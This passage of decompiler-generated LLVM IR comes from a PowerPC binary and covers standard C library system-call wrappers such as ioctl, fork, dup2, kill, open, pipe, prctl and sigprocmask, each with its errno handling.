  uselistorder label %dec_label_pc_1000b7d8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b7b8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b69c, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_1000c058 = icmp eq i32 %arg2, -2143521772
  %v2_1000c06c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000c06c, i32* %stack_var_-32, align 4
  br i1 %v4_1000c058, label %dec_label_pc_1000c0cc, label %dec_label_pc_1000c08c

dec_label_pc_1000c08c:                            ; preds = %entry
  %v3_1000c08c = icmp ugt i32 %arg2, -2143521772
  br i1 %v3_1000c08c, label %dec_label_pc_1000c0a4, label %dec_label_pc_1000c094

dec_label_pc_1000c094:                            ; preds = %dec_label_pc_1000c08c
  %v3_1000c098 = icmp eq i32 %arg2, 1077703699
  br i1 %v3_1000c098, label %dec_label_pc_1000c0c0, label %dec_label_pc_1000c0ec

dec_label_pc_1000c0a4:                            ; preds = %dec_label_pc_1000c08c
  %v1_1000c0a4 = xor i32 %arg2, -2143551488
  %v3_1000c0a8 = icmp eq i32 %v1_1000c0a4, 29717
  br i1 %v3_1000c0a8, label %dec_label_pc_1000c0dc, label %dec_label_pc_1000c0b0

dec_label_pc_1000c0b0:                            ; preds = %dec_label_pc_1000c0a4
  %v3_1000c0b4 = icmp eq i32 %v1_1000c0a4, 29718
  br i1 %v3_1000c0b4, label %dec_label_pc_1000c0e4, label %dec_label_pc_1000c0ec

dec_label_pc_1000c0c0:                            ; preds = %dec_label_pc_1000c094
  store i32 ptrtoint (i32* @global_var_1000c0c8.701 to i32), i32* @lr, align 4
  %v1_1000c0c4 = inttoptr i32 %arg3 to i32*
  %v2_1000c0c4 = call i32 @__GI_tcgetattr(i32* %v1_1000c0c4)
  br label %dec_label_pc_1000c0d4

dec_label_pc_1000c0cc:                            ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1000c0d0

dec_label_pc_1000c0d0:                            ; preds = %dec_label_pc_1000c0e4, %dec_label_pc_1000c0dc, %dec_label_pc_1000c0cc
  store i32 268484820, i32* @lr, align 4
  %v0_1000c0d0 = call i32 @__GI_tcsetattr()
  br label %dec_label_pc_1000c0d4

dec_label_pc_1000c0d4:                            ; preds = %dec_label_pc_1000c0c0, %dec_label_pc_1000c0d0
  %storemerge = phi i32 [ %v0_1000c0d0, %dec_label_pc_1000c0d0 ], [ %v2_1000c0c4, %dec_label_pc_1000c0c0 ]
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c118

dec_label_pc_1000c0dc:                            ; preds = %dec_label_pc_1000c0a4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_1000c0d0

dec_label_pc_1000c0e4:                            ; preds = %dec_label_pc_1000c0b0
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_1000c0d0

dec_label_pc_1000c0ec:                            ; preds = %dec_label_pc_1000c0b0, %dec_label_pc_1000c094
  %v0_1000c0fc = call i32 @__asm_mfcr()
  %v1_1000c100 = and i32 %v0_1000c0fc, 268435456
  %v3_1000c100 = icmp eq i32 %v1_1000c100, 0
  store i32 %v0_1000c0fc, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c100, label %dec_label_pc_1000c118, label %dec_label_pc_1000c10c

dec_label_pc_1000c10c:                            ; preds = %dec_label_pc_1000c0ec
  %v0_1000c10c = call i32 @__errno_location()
  %v0_1000c110 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c110 = inttoptr i32 %v0_1000c10c to i32*
  store i32 %v0_1000c110, i32* %v2_1000c110, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c118

dec_label_pc_1000c118:                            ; preds = %dec_label_pc_1000c0ec, %dec_label_pc_1000c0d4, %dec_label_pc_1000c10c
  %v0_1000c11c = phi i32 [ %v0_1000c0fc, %dec_label_pc_1000c0ec ], [ %storemerge, %dec_label_pc_1000c0d4 ], [ -1, %dec_label_pc_1000c10c ]
  ret i32 %v0_1000c11c

; uselistorder directives
  uselistorder i32 %arg2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000c118, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c0d4, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_1000c138 = load i32, i32* @lr, align 4
  %v1_1000c138 = load i1, i1* @cr0_so, align 1
  %v2_1000c138 = xor i1 %v1_1000c138, true
  call void @__pseudo_cond_branch(i1 %v2_1000c138, i32 %v0_1000c138)
  %v0_1000c13c = call i32 @__syscall_error()
  ret i32 %v0_1000c13c
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_1000c154 = add i32 %arg2, -12
  %v2_1000c158 = icmp ugt i32 %v1_1000c154, 2
  %v2_1000c160 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000c160, i32* %stack_var_-32, align 4
  br i1 %v2_1000c158, label %dec_label_pc_1000c18c, label %dec_label_pc_1000c17c

dec_label_pc_1000c17c:                            ; preds = %entry
  store i32 268484996, i32* @lr, align 4
  %v2_1000c180 = call i32 @__GI_fcntl64(i32 3)
  store i32 %v2_1000c180, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c1ac

dec_label_pc_1000c18c:                            ; preds = %entry
  %v0_1000c190 = call i32 @__asm_mfcr()
  %v1_1000c194 = and i32 %v0_1000c190, 268435456
  %v3_1000c194 = icmp eq i32 %v1_1000c194, 0
  store i32 %v0_1000c190, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c194, label %dec_label_pc_1000c1ac, label %dec_label_pc_1000c1a0

dec_label_pc_1000c1a0:                            ; preds = %dec_label_pc_1000c18c
  %v0_1000c1a0 = call i32 @__errno_location()
  %v0_1000c1a4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c1a4 = inttoptr i32 %v0_1000c1a0 to i32*
  store i32 %v0_1000c1a4, i32* %v2_1000c1a4, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c1ac

dec_label_pc_1000c1ac:                            ; preds = %dec_label_pc_1000c18c, %dec_label_pc_1000c17c, %dec_label_pc_1000c1a0
  %v0_1000c1b0 = phi i32 [ %v0_1000c190, %dec_label_pc_1000c18c ], [ %v2_1000c180, %dec_label_pc_1000c17c ], [ -1, %dec_label_pc_1000c1a0 ]
  ret i32 %v0_1000c1b0

; uselistorder directives
  uselistorder label %dec_label_pc_1000c1ac, { 2, 0, 1 }
}

define i32 @__GI_fcntl64(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_1000c1dc = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000c1dc, i32* %stack_var_-32, align 4
  %v0_1000c1f8 = call i32 @__asm_mfcr()
  %v1_1000c1fc = and i32 %v0_1000c1f8, 268435456
  %v3_1000c1fc = icmp eq i32 %v1_1000c1fc, 0
  store i32 %v0_1000c1f8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c1fc, label %dec_label_pc_1000c214, label %dec_label_pc_1000c208

dec_label_pc_1000c208:                            ; preds = %entry
  %v0_1000c208 = call i32 @__errno_location()
  %v0_1000c20c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c20c = inttoptr i32 %v0_1000c208 to i32*
  store i32 %v0_1000c20c, i32* %v2_1000c20c, align 4
  br label %dec_label_pc_1000c214

dec_label_pc_1000c214:                            ; preds = %entry, %dec_label_pc_1000c208
  %v0_1000c224 = phi i32 [ %v0_1000c1f8, %entry ], [ -1, %dec_label_pc_1000c208 ]
  ret i32 %v0_1000c224

; uselistorder directives
  uselistorder label %dec_label_pc_1000c214, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  br label %dec_label_pc_1000c23c

dec_label_pc_1000c23c:                            ; preds = %dec_label_pc_1000c23c.backedge, %entry
  %v0_1000c248 = call i32 @__asm_mfcr()
  %v1_1000c24c = and i32 %v0_1000c248, 268435456
  %v3_1000c24c = icmp eq i32 %v1_1000c24c, 0
  store i32 %v0_1000c248, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c24c, label %dec_label_pc_1000c23c.backedge, label %dec_label_pc_1000c258

dec_label_pc_1000c258:                            ; preds = %dec_label_pc_1000c23c
  %v0_1000c258 = call i32 @__errno_location()
  %v0_1000c25c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c25c = inttoptr i32 %v0_1000c258 to i32*
  store i32 %v0_1000c25c, i32* %v2_1000c25c, align 4
  br label %dec_label_pc_1000c23c.backedge

dec_label_pc_1000c23c.backedge:                   ; preds = %dec_label_pc_1000c258, %dec_label_pc_1000c23c
  br label %dec_label_pc_1000c23c
}

define i32 @access(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c27c = call i32 @__asm_mfcr()
  %v1_1000c280 = and i32 %v0_1000c27c, 268435456
  %v3_1000c280 = icmp eq i32 %v1_1000c280, 0
  store i32 %v0_1000c27c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c280, label %dec_label_pc_1000c298, label %dec_label_pc_1000c28c

dec_label_pc_1000c28c:                            ; preds = %entry
  %v0_1000c28c = call i32 @__errno_location()
  %v0_1000c290 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c290 = inttoptr i32 %v0_1000c28c to i32*
  store i32 %v0_1000c290, i32* %v2_1000c290, align 4
  br label %dec_label_pc_1000c298

dec_label_pc_1000c298:                            ; preds = %entry, %dec_label_pc_1000c28c
  %v0_1000c2a8 = phi i32 [ %v0_1000c27c, %entry ], [ -1, %dec_label_pc_1000c28c ]
  ret i32 %v0_1000c2a8

; uselistorder directives
  uselistorder label %dec_label_pc_1000c298, { 1, 0 }
}

define i32 @chdir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c2c4 = call i32 @__asm_mfcr()
  %v1_1000c2c8 = and i32 %v0_1000c2c4, 268435456
  %v3_1000c2c8 = icmp eq i32 %v1_1000c2c8, 0
  store i32 %v0_1000c2c4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c2c8, label %dec_label_pc_1000c2e0, label %dec_label_pc_1000c2d4

dec_label_pc_1000c2d4:                            ; preds = %entry
  %v0_1000c2d4 = call i32 @__errno_location()
  %v0_1000c2d8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c2d8 = inttoptr i32 %v0_1000c2d4 to i32*
  store i32 %v0_1000c2d8, i32* %v2_1000c2d8, align 4
  br label %dec_label_pc_1000c2e0

dec_label_pc_1000c2e0:                            ; preds = %entry, %dec_label_pc_1000c2d4
  %v0_1000c2f0 = phi i32 [ %v0_1000c2c4, %entry ], [ -1, %dec_label_pc_1000c2d4 ]
  ret i32 %v0_1000c2f0

; uselistorder directives
  uselistorder label %dec_label_pc_1000c2e0, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c30c = call i32 @__asm_mfcr()
  %v1_1000c310 = and i32 %v0_1000c30c, 268435456
  %v3_1000c310 = icmp eq i32 %v1_1000c310, 0
  store i32 %v0_1000c30c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c310, label %dec_label_pc_1000c328, label %dec_label_pc_1000c31c

dec_label_pc_1000c31c:                            ; preds = %entry
  %v0_1000c31c = call i32 @__errno_location()
  %v0_1000c320 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c320 = inttoptr i32 %v0_1000c31c to i32*
  store i32 %v0_1000c320, i32* %v2_1000c320, align 4
  br label %dec_label_pc_1000c328

dec_label_pc_1000c328:                            ; preds = %entry, %dec_label_pc_1000c31c
  %v0_1000c338 = phi i32 [ %v0_1000c30c, %entry ], [ -1, %dec_label_pc_1000c31c ]
  ret i32 %v0_1000c338

; uselistorder directives
  uselistorder label %dec_label_pc_1000c328, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c354 = call i32 @__asm_mfcr()
  %v1_1000c358 = and i32 %v0_1000c354, 268435456
  %v3_1000c358 = icmp eq i32 %v1_1000c358, 0
  store i32 %v0_1000c354, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c358, label %dec_label_pc_1000c370, label %dec_label_pc_1000c364

dec_label_pc_1000c364:                            ; preds = %entry
  %v0_1000c364 = call i32 @__errno_location()
  %v0_1000c368 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c368 = inttoptr i32 %v0_1000c364 to i32*
  store i32 %v0_1000c368, i32* %v2_1000c368, align 4
  br label %dec_label_pc_1000c370

dec_label_pc_1000c370:                            ; preds = %entry, %dec_label_pc_1000c364
  %v0_1000c380 = phi i32 [ %v0_1000c354, %entry ], [ -1, %dec_label_pc_1000c364 ]
  ret i32 %v0_1000c380

; uselistorder directives
  uselistorder label %dec_label_pc_1000c370, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c39c = call i32 @__asm_mfcr()
  %v1_1000c3a0 = and i32 %v0_1000c39c, 268435456
  %v3_1000c3a0 = icmp eq i32 %v1_1000c3a0, 0
  store i32 %v0_1000c39c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c3a0, label %dec_label_pc_1000c3b8, label %dec_label_pc_1000c3ac

dec_label_pc_1000c3ac:                            ; preds = %entry
  %v0_1000c3ac = call i32 @__errno_location()
  %v0_1000c3b0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c3b0 = inttoptr i32 %v0_1000c3ac to i32*
  store i32 %v0_1000c3b0, i32* %v2_1000c3b0, align 4
  br label %dec_label_pc_1000c3b8

dec_label_pc_1000c3b8:                            ; preds = %entry, %dec_label_pc_1000c3ac
  %v0_1000c3c8 = phi i32 [ %v0_1000c39c, %entry ], [ -1, %dec_label_pc_1000c3ac ]
  ret i32 %v0_1000c3c8

; uselistorder directives
  uselistorder label %dec_label_pc_1000c3b8, { 1, 0 }
}

define i32 @getdtablesize(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000c3d8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268485604, i32* @lr, align 4
  %v2_1000c3e0 = call i32 @getrlimit(i32 7, i32 %v2_1000c3d8)
  %v1_1000c3e4 = icmp slt i32 %v2_1000c3e0, 0
  br i1 %v1_1000c3e4, label %dec_label_pc_1000c3f4, label %dec_label_pc_1000c3f0

dec_label_pc_1000c3f0:                            ; preds = %entry
  %v3_1000c3f0 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000c3f4

dec_label_pc_1000c3f4:                            ; preds = %entry, %dec_label_pc_1000c3f0
  %v0_1000c400 = phi i32 [ 256, %entry ], [ %v3_1000c3f0, %dec_label_pc_1000c3f0 ]
  ret i32 %v0_1000c400

; uselistorder directives
  uselistorder label %dec_label_pc_1000c3f4, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c41c = call i32 @__asm_mfcr()
  %v1_1000c420 = and i32 %v0_1000c41c, 268435456
  %v3_1000c420 = icmp eq i32 %v1_1000c420, 0
  store i32 %v0_1000c41c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c420, label %dec_label_pc_1000c438, label %dec_label_pc_1000c42c

dec_label_pc_1000c42c:                            ; preds = %entry
  %v0_1000c42c = call i32 @__errno_location()
  %v0_1000c430 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c430 = inttoptr i32 %v0_1000c42c to i32*
  store i32 %v0_1000c430, i32* %v2_1000c430, align 4
  br label %dec_label_pc_1000c438

dec_label_pc_1000c438:                            ; preds = %entry, %dec_label_pc_1000c42c
  %v0_1000c448 = phi i32 [ %v0_1000c41c, %entry ], [ -1, %dec_label_pc_1000c42c ]
  ret i32 %v0_1000c448

; uselistorder directives
  uselistorder label %dec_label_pc_1000c438, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c464 = call i32 @__asm_mfcr()
  %v1_1000c468 = and i32 %v0_1000c464, 268435456
  %v3_1000c468 = icmp eq i32 %v1_1000c468, 0
  store i32 %v0_1000c464, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c468, label %dec_label_pc_1000c480, label %dec_label_pc_1000c474

dec_label_pc_1000c474:                            ; preds = %entry
  %v0_1000c474 = call i32 @__errno_location()
  %v0_1000c478 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c478 = inttoptr i32 %v0_1000c474 to i32*
  store i32 %v0_1000c478, i32* %v2_1000c478, align 4
  br label %dec_label_pc_1000c480

dec_label_pc_1000c480:                            ; preds = %entry, %dec_label_pc_1000c474
  %v0_1000c490 = phi i32 [ %v0_1000c464, %entry ], [ -1, %dec_label_pc_1000c474 ]
  ret i32 %v0_1000c490

; uselistorder directives
  uselistorder label %dec_label_pc_1000c480, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c4ac = call i32 @__asm_mfcr()
  %v1_1000c4b0 = and i32 %v0_1000c4ac, 268435456
  %v3_1000c4b0 = icmp eq i32 %v1_1000c4b0, 0
  store i32 %v0_1000c4ac, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c4b0, label %dec_label_pc_1000c4c8, label %dec_label_pc_1000c4bc

dec_label_pc_1000c4bc:                            ; preds = %entry
  %v0_1000c4bc = call i32 @__errno_location()
  %v0_1000c4c0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c4c0 = inttoptr i32 %v0_1000c4bc to i32*
  store i32 %v0_1000c4c0, i32* %v2_1000c4c0, align 4
  br label %dec_label_pc_1000c4c8

dec_label_pc_1000c4c8:                            ; preds = %entry, %dec_label_pc_1000c4bc
  %v0_1000c4d8 = phi i32 [ %v0_1000c4ac, %entry ], [ -1, %dec_label_pc_1000c4bc ]
  ret i32 %v0_1000c4d8

; uselistorder directives
  uselistorder label %dec_label_pc_1000c4c8, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c4f4 = call i32 @__asm_mfcr()
  %v1_1000c4f8 = and i32 %v0_1000c4f4, 268435456
  %v3_1000c4f8 = icmp eq i32 %v1_1000c4f8, 0
  store i32 %v0_1000c4f4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c4f8, label %dec_label_pc_1000c510, label %dec_label_pc_1000c504

dec_label_pc_1000c504:                            ; preds = %entry
  %v0_1000c504 = call i32 @__errno_location()
  %v0_1000c508 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c508 = inttoptr i32 %v0_1000c504 to i32*
  store i32 %v0_1000c508, i32* %v2_1000c508, align 4
  br label %dec_label_pc_1000c510

dec_label_pc_1000c510:                            ; preds = %entry, %dec_label_pc_1000c504
  %v0_1000c520 = phi i32 [ %v0_1000c4f4, %entry ], [ -1, %dec_label_pc_1000c504 ]
  ret i32 %v0_1000c520

; uselistorder directives
  uselistorder label %dec_label_pc_1000c510, { 1, 0 }
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_1000c538 = and i32 %arg2, 64
  %v3_1000c538 = icmp eq i32 %v1_1000c538, 0
  br i1 %v3_1000c538, label %dec_label_pc_1000c564, label %dec_label_pc_1000c548

dec_label_pc_1000c548:                            ; preds = %entry
  %v2_1000c550 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000c550, i32* %stack_var_-32, align 4
  %v0_1000c560 = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000c564

dec_label_pc_1000c564:                            ; preds = %entry, %dec_label_pc_1000c548
  %v0_1000c564 = phi i32 [ 0, %entry ], [ %v0_1000c560, %dec_label_pc_1000c548 ]
  store i32 %v0_1000c564, i32* @r5, align 4
  %v0_1000c56c = call i32 @__asm_mfcr()
  %v1_1000c570 = and i32 %v0_1000c56c, 268435456
  %v3_1000c570 = icmp eq i32 %v1_1000c570, 0
  store i32 %v0_1000c56c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c570, label %dec_label_pc_1000c588, label %dec_label_pc_1000c57c

dec_label_pc_1000c57c:                            ; preds = %dec_label_pc_1000c564
  %v0_1000c57c = call i32 @__errno_location()
  %v0_1000c580 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c580 = inttoptr i32 %v0_1000c57c to i32*
  store i32 %v0_1000c580, i32* %v2_1000c580, align 4
  br label %dec_label_pc_1000c588

dec_label_pc_1000c588:                            ; preds = %dec_label_pc_1000c564, %dec_label_pc_1000c57c
  %v0_1000c598 = phi i32 [ %v0_1000c56c, %dec_label_pc_1000c564 ], [ -1, %dec_label_pc_1000c57c ]
  ret i32 %v0_1000c598

; uselistorder directives
  uselistorder label %dec_label_pc_1000c588, { 1, 0 }
  uselistorder label %dec_label_pc_1000c564, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r5, align 4
  %v2_1000c5a8 = call i32 @__libc_open(i32 577, i32 577)
  ret i32 %v2_1000c5a8
}

define i32 @__GI_pipe(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c5c4 = call i32 @__asm_mfcr()
  %v1_1000c5c8 = and i32 %v0_1000c5c4, 268435456
  %v3_1000c5c8 = icmp eq i32 %v1_1000c5c8, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_1000c5c4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c5c8, label %dec_label_pc_1000c5e0, label %dec_label_pc_1000c5d4

dec_label_pc_1000c5d4:                            ; preds = %entry
  %v0_1000c5d4 = call i32 @__errno_location()
  %v0_1000c5d8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c5d8 = inttoptr i32 %v0_1000c5d4 to i32*
  store i32 %v0_1000c5d8, i32* %v2_1000c5d8, align 4
  br label %dec_label_pc_1000c5e0

dec_label_pc_1000c5e0:                            ; preds = %entry, %dec_label_pc_1000c5d4
  %v0_1000c5f0 = phi i32 [ %v0_1000c5c4, %entry ], [ -1, %dec_label_pc_1000c5d4 ]
  ret i32 %v0_1000c5f0

; uselistorder directives
  uselistorder label %dec_label_pc_1000c5e0, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c60c = call i32 @__asm_mfcr()
  %v1_1000c610 = and i32 %v0_1000c60c, 268435456
  %v3_1000c610 = icmp eq i32 %v1_1000c610, 0
  store i32 %v0_1000c60c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c610, label %dec_label_pc_1000c628, label %dec_label_pc_1000c61c

dec_label_pc_1000c61c:                            ; preds = %entry
  %v0_1000c61c = call i32 @__errno_location()
  %v0_1000c620 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c620 = inttoptr i32 %v0_1000c61c to i32*
  store i32 %v0_1000c620, i32* %v2_1000c620, align 4
  br label %dec_label_pc_1000c628

dec_label_pc_1000c628:                            ; preds = %entry, %dec_label_pc_1000c61c
  %v0_1000c638 = phi i32 [ %v0_1000c60c, %entry ], [ -1, %dec_label_pc_1000c61c ]
  ret i32 %v0_1000c638

; uselistorder directives
  uselistorder label %dec_label_pc_1000c628, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c654 = call i32 @__asm_mfcr()
  %v1_1000c658 = and i32 %v0_1000c654, 268435456
  %v3_1000c658 = icmp eq i32 %v1_1000c658, 0
  store i32 %v0_1000c654, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c658, label %dec_label_pc_1000c670, label %dec_label_pc_1000c664

dec_label_pc_1000c664:                            ; preds = %entry
  %v0_1000c664 = call i32 @__errno_location()
  %v0_1000c668 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c668 = inttoptr i32 %v0_1000c664 to i32*
  store i32 %v0_1000c668, i32* %v2_1000c668, align 4
  br label %dec_label_pc_1000c670

dec_label_pc_1000c670:                            ; preds = %entry, %dec_label_pc_1000c664
  %v0_1000c680 = phi i32 [ %v0_1000c654, %entry ], [ -1, %dec_label_pc_1000c664 ]
  ret i32 %v0_1000c680

; uselistorder directives
  uselistorder label %dec_label_pc_1000c670, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c69c = call i32 @__asm_mfcr()
  %v1_1000c6a0 = and i32 %v0_1000c69c, 268435456
  %v3_1000c6a0 = icmp eq i32 %v1_1000c6a0, 0
  store i32 %v0_1000c69c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c6a0, label %dec_label_pc_1000c6b8, label %dec_label_pc_1000c6ac

dec_label_pc_1000c6ac:                            ; preds = %entry
  %v0_1000c6ac = call i32 @__errno_location()
  %v0_1000c6b0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c6b0 = inttoptr i32 %v0_1000c6ac to i32*
  store i32 %v0_1000c6b0, i32* %v2_1000c6b0, align 4
  br label %dec_label_pc_1000c6b8

dec_label_pc_1000c6b8:                            ; preds = %entry, %dec_label_pc_1000c6ac
  %v0_1000c6c8 = phi i32 [ %v0_1000c69c, %entry ], [ -1, %dec_label_pc_1000c6ac ]
  ret i32 %v0_1000c6c8

; uselistorder directives
  uselistorder label %dec_label_pc_1000c6b8, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c6e4 = call i32 @__asm_mfcr()
  %v1_1000c6e8 = and i32 %v0_1000c6e4, 268435456
  %v3_1000c6e8 = icmp eq i32 %v1_1000c6e8, 0
  store i32 %v0_1000c6e4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c6e8, label %dec_label_pc_1000c700, label %dec_label_pc_1000c6f4

dec_label_pc_1000c6f4:                            ; preds = %entry
  %v0_1000c6f4 = call i32 @__errno_location()
  %v0_1000c6f8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c6f8 = inttoptr i32 %v0_1000c6f4 to i32*
  store i32 %v0_1000c6f8, i32* %v2_1000c6f8, align 4
  br label %dec_label_pc_1000c700

dec_label_pc_1000c700:                            ; preds = %entry, %dec_label_pc_1000c6f4
  %v0_1000c710 = phi i32 [ %v0_1000c6e4, %entry ], [ -1, %dec_label_pc_1000c6f4 ]
  ret i32 %v0_1000c710

; uselistorder directives
  uselistorder label %dec_label_pc_1000c700, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v3_1000c714 = icmp eq i32 %arg2, 0
  br i1 %v3_1000c714, label %dec_label_pc_1000c754, label %dec_label_pc_1000c73c

dec_label_pc_1000c73c:                            ; preds = %entry
  store i32 -1, i32* %r31.global-to-local, align 4
  %tmp5 = icmp ult i32 %arg1, 3
  br i1 %tmp5, label %dec_label_pc_1000c754, label %dec_label_pc_1000c744

dec_label_pc_1000c744:                            ; preds = %dec_label_pc_1000c73c
  %v0_1000c744 = call i32 @__errno_location()
  %v2_1000c74c = inttoptr i32 %v0_1000c744 to i32*
  store i32 22, i32* %v2_1000c74c, align 4
  %v0_1000c778.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c774

dec_label_pc_1000c754:                            ; preds = %dec_label_pc_1000c73c, %entry
  %v0_1000c758 = call i32 @__asm_mfcr()
  %v1_1000c75c = and i32 %v0_1000c758, 268435456
  %v3_1000c75c = icmp eq i32 %v1_1000c75c, 0
  store i32 %v0_1000c758, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c75c, label %dec_label_pc_1000c774, label %dec_label_pc_1000c768

dec_label_pc_1000c768:                            ; preds = %dec_label_pc_1000c754
  %v0_1000c768 = call i32 @__errno_location()
  %v0_1000c76c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c76c = inttoptr i32 %v0_1000c768 to i32*
  store i32 %v0_1000c76c, i32* %v2_1000c76c, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c774

dec_label_pc_1000c774:                            ; preds = %dec_label_pc_1000c754, %dec_label_pc_1000c744, %dec_label_pc_1000c768
  %v0_1000c778 = phi i32 [ %v0_1000c758, %dec_label_pc_1000c754 ], [ %v0_1000c778.pre, %dec_label_pc_1000c744 ], [ -1, %dec_label_pc_1000c768 ]
  ret i32 %v0_1000c778

; uselistorder directives
  uselistorder label %dec_label_pc_1000c774, { 2, 0, 1 }
}

define i32 @__GI_time(i32 %arg1) local_unnamed_addr {
entry:
